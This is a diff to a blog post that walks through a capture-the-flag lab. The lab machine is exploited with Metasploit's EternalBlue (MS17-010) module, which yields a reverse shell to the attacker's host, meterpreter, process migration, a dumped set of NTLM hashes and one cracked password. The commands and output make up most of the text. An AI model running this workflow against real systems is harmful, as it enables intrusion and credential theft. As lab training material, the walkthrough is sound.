@@ -26,8 +26,7 @@ Here we go with an old vulnerability from 2017.
 
 As per the usual, start off with an nmap to scan the IP address for the open ports.
 
-{% raw %}
-```bash
+{% capture nmap %}
 ┌──(sec㉿kali)-[~]
 └─$ nmap -sV -sC -A -O --script vuln -oN nmap 10.10.18.22 
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-07 00:51 AEDT
@@ -61,9 +60,12 @@ Host script results:
 |_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
 
 <snip>
+{% endcapture %}
 
-```
-{% endraw %}
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=nmap %}
 
 <br />
 Notice the vuln scripts says this machine is vulnerable to MS17-010.  Read the <a href="https://learn.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010">Microsoft Security Bulletin</a> if it interests you.
@@ -77,19 +79,21 @@ Notice the vuln scripts says this machine is vulnerable to MS17-010.  Read the <
 <br />
 Start msfvenom and use the q option to supress the ascii art.
 
-{% raw %}
-```bash
+{% capture startmsfconsole %}
 ┌──(sec㉿kali)-[~]
 └─$ msfconsole -q                                                                                                      
 msf6 > 
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=startmsfconsole %}
 
 <br />
 Search msfconsole for the ms17-010 exploit.
 
-{% raw %}
-```bash
+{% capture searchblue %}
 msf6 > search ms17-010
 
 Matching Modules
@@ -131,25 +135,31 @@ Matching Modules
 
 Interact with a module by name or index. For example info 29, use 29 or use exploit/windows/smb/smb_doublepulsar_rce
 After interacting with a module you can manually set a TARGET with set TARGET 'Neutralize implant'
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=searchblue %}
 
 <br />
 Choose to use the payload at the top of the list.
 
-{% raw %}
-```bash
+{% capture usepayload %}
 msf6 > use exploit/windows/smb/ms17_010_eternalblue
 [*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
 msf6 exploit(windows/smb/ms17_010_eternalblue) >
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=usepayload %}
 
 <br />
 Use the show options command to view the options for this payload.
 
-{% raw %}
-```bash
+{% capture showoptions %}
 [*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
 msf6 exploit(windows/smb/ms17_010_eternalblue) > show options
 
@@ -184,46 +194,58 @@ Exploit target:
 
 
 View the full module info with the info, or info -d command.
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=showoptions %}
 
 <br />
 Set the RHOSTS because it is a require option.  Plus, the exploit will need to know it to know what to attack.
 
-{% raw %}
-```bash
+{% capture setrhosts %}
 msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.18.22
 RHOSTS => 10.10.18.22
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=setrhosts %}
 
 <br />
 Set LHOST to the IP on the tun0 interface.
 
-{% raw %}
-```bash
+{% capture setlhost %}
 msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST tun0
 LHOST => 10.4.119.29
 msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST tun0
 LHOST => 10.4.119.29
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=setlhost %}
 
 <br />
 Set the payload to a staged, x64 shell payload.  This is for practice purposes.
 
-{% raw %}
-```bash
+{% capture setpayload %}
 msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/shell/reverse_tcp
 PAYLOAD => windows/x64/shell/reverse_tcp
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=setpayload %}
 
 <br />
 Use exploit to run the command.
 
-{% raw %}
-```bash
+{% capture runexploit %}
 msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
 
 [*] Started reverse TCP handler on 10.4.119.29:4444 
@@ -240,30 +262,44 @@ msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
 
 
 Shell Banner:
+{% endcapture %}
+
+{% capture catchshell %}
 Microsoft Windows [Version 6.1.7601]
 -----
           
 
 C:\Windows\system32>
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=runexploit %}
+
+{% include terminal.html
+   language="cmd"
+   title="cmd.exe"
+   content=catchshell %}
 
 <br />
 Use control + z to background the session.
 
-{% raw %}
-```bash
+{% capture backgroundsession %}
 C:\Windows\system32>^Z
 Background session 1? [y/N]  y
 msf6 exploit(windows/smb/ms17_010_eternalblue) > 
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=backgroundsession %}
 
 <br />
 Search for shell_to_meterpreter to find a way to upgrade our shell to meterpreter.
 
-{% raw %}
-```bash
+{% capture shelltometerpreter %}
 msf6 exploit(windows/smb/ms17_010_eternalblue) > search shell_to_meterpreter
 
 Matching Modules
@@ -275,24 +311,30 @@ Matching Modules
 
 
 Interact with a module by name or index. For example info 0, use 0 or use post/multi/manage/shell_to_meterpreter
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=shelltometerpreter %}
 
 <br />
 Use the use command to use the exploit discovered in the search.
 
-{% raw %}
-```bash
+{% capture useshelltometerpreter %}
 msf6 exploit(windows/smb/ms17_010_eternalblue) > use post/multi/manage/shell_to_meterpreter
 msf6 post(multi/manage/shell_to_meterpreter) >
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=useshelltometerpreter %}
 
 <br />
 Show the options for this exploit to discover what options are required.
 
-{% raw %}
-```bash
+{% capture shelloptions %}
 msf6 post(multi/manage/shell_to_meterpreter) > show options
 
 Module options (post/multi/manage/shell_to_meterpreter):
@@ -306,26 +348,32 @@ Module options (post/multi/manage/shell_to_meterpreter):
 
 
 View the full module info with the info, or info -d command.
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=shelloptions %}
 
 <br />
 Set LHOST to the IP on the tun0 interface.
 
-{% raw %}
-```bash
+{% capture shelltometerlhost %}
 msf6 post(multi/manage/shell_to_meterpreter) > set LHOST tun0
 LHOST => 10.4.119.29
 msf6 post(multi/manage/shell_to_meterpreter) > set LHOST tun0
 LHOST => 10.4.119.29
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=shelltometerlhost %}
 
 <br />
 Use sessions to get a list of the Active seesions for this metasploit run.
 
-{% raw %}
-```bash
+{% capture getsessions %}
 msf6 post(multi/manage/shell_to_meterpreter) > sessions
 
 Active sessions
@@ -334,38 +382,47 @@ Active sessions
   Id  Name  Type               Information                                               Connection
   --  ----  ----               -----------                                               ----------
   1         shell x64/windows  Shell Banner: Microsoft Windows [Version 6.1.7601] -----  10.4.119.29:4444 -> 10.10.18.22:49203 (10.10.18.22)
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=getsessions %}
 
 <br />
 Set the SESSION to the session from the shell that was caught earlier.
 
-{% raw %}
-```bash
+{% capture setshellsessions %}
 msf6 post(multi/manage/shell_to_meterpreter) > set SESSION 1
 SESSION => 1
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=setshellsessions %}
 
 <br />
 Run the exploit and see if you start another session with meterpreter.
 
-{% raw %}
-```bash
+{% capture runfirstexploit %}
 msf6 post(multi/manage/shell_to_meterpreter) > exploit
 
 [*] Upgrading session ID: 1
 [*] Starting exploit/multi/handler
 [*] Started reverse TCP handler on 10.4.119.29:4433 
 [*] Post module execution completed
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=runfirstexploit %}
 
 <br />
 If this does not work, reexploit the machine from the beginning.
 
-{% raw %}
-```bash
+{% capture shelltometerpreterexploit %}
 msf6 post(multi/manage/shell_to_meterpreter) > exploit
 
 [*] Upgrading session ID: 1
@@ -380,24 +437,30 @@ sessions -i 2
 [*] Starting interaction with 2...
 
 meterpreter >
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=shelltometerpreterexploit %}
 
 <br />
 Run the getsystem command to ensure that we are running as SYSTEM.
 
-{% raw %}
-```bash
+{% capture getsystem %}
 meterpreter > getsystem
 [-] Already running as SYSTEM
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=getsystem %}
 
 <br />
-Just because the user is SYsTEM, does not mean that the process we are running as is.  So, run the ps command to get a list of running processes.
+Just because the user is SYSTEM, does not mean that the process we are running as is.  So, run the ps command to get a list of running processes.
 
-{% raw %}
-```bash
+{% capture runps %}
 meterpreter > ps
 
 Process List
@@ -414,37 +477,46 @@ Process List
  <snip>
 
  meterpreter >
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=runps %}
 
 <br />
 Choose a process that is running as NT AUTHORITY\SYSTEM.  Migrate to this process using the PID.  If this doesn't work, reboot the machine and start over...again.
 
-{% raw %}
-```bash
+{% capture migrateprocess %}
 meterpreter > migrate 1288
 [*] Migrating from 1840 to 1288...
 [*] Migration completed successfully.
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=migrateprocess %}
 
 <br />
 Run the hashdump command to get a list of the hashes.
 
-{% raw %}
-```bash
+{% capture hashdump %}
 meterpreter > hashdump
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=hashdump %}
 
 <br />
 Use john the ripper to crack the dumped permission.
 
-{% raw %}
-```bash
+{% capture jackripper %}
 ┌──(sec㉿kali)-[~]
 └─$ john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt ntlmpass2 
 Using default input encoding: UTF-8
@@ -457,14 +529,17 @@ alqfna22         (?)
 Warning: passwords printed above might not be all those cracked
 Use the "--show --format=NT" options to display all of the cracked passwords reliably
 Session completed.
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=jackripper %}
 
 <br />
 Get the first flag.
 
-{% raw %}
-```bash
+{% capture firstflag %}
 C:\Windows\system32>cd C:\
 cd C:\
 
@@ -505,14 +580,17 @@ Tunnel adapter isatap.eu-west-1.compute.internal:
 
    Media State . . . . . . . . . . . : Media disconnected
    Connection-specific DNS Suffix  . : eu-west-1.compute.internal
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="cmd"
+   title="cmd.exe"
+   content=firstflag %}
 
 <br />
 Get the second flag.
 
-{% raw %}
-```bash
+{% capture secondflag %}
 C:\>cd C:\Windows\system32\config
 cd C:\Windows\system32\config
 
@@ -563,14 +641,17 @@ Tunnel adapter isatap.eu-west-1.compute.internal:
    Connection-specific DNS Suffix  . : eu-west-1.compute.internal
 
 C:\Windows\System32\config>
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="cmd"
+   title="cmd.exe"
+   content=secondflag %}
 
 <br />
 Use dir to find the third flag.
 
-{% raw %}
-```bash
+{% capture searchthird %}
 C:\Users>cd C:\
 cd C:\
 
@@ -600,14 +681,17 @@ dir /s *flag*
 
 03/17/2019  01:32 PM                34 flag2.txt
                1 File(s)             34 bytes
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="cmd"
+   title="cmd.exe"
+   content=searchthird %}
 
 <br />
 Get the third flag.
 
-{% raw %}
-```bash
+{% capture thirdflag %}
 C:\Windows\system32>type C:\Users\Jon\Documents\flag3.txt
 type C:\Users\Jon\Documents\flag3.txt
 <redacted>
@@ -629,8 +713,12 @@ Tunnel adapter isatap.eu-west-1.compute.internal:
 
    Media State . . . . . . . . . . . : Media disconnected
    Connection-specific DNS Suffix  . : eu-west-1.compute.internal
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="cmd"
+   title="cmd.exe"
+   content=thirdflag %}
 
 <br />
 And with that, another box down.  Feel free to check out another write-up.
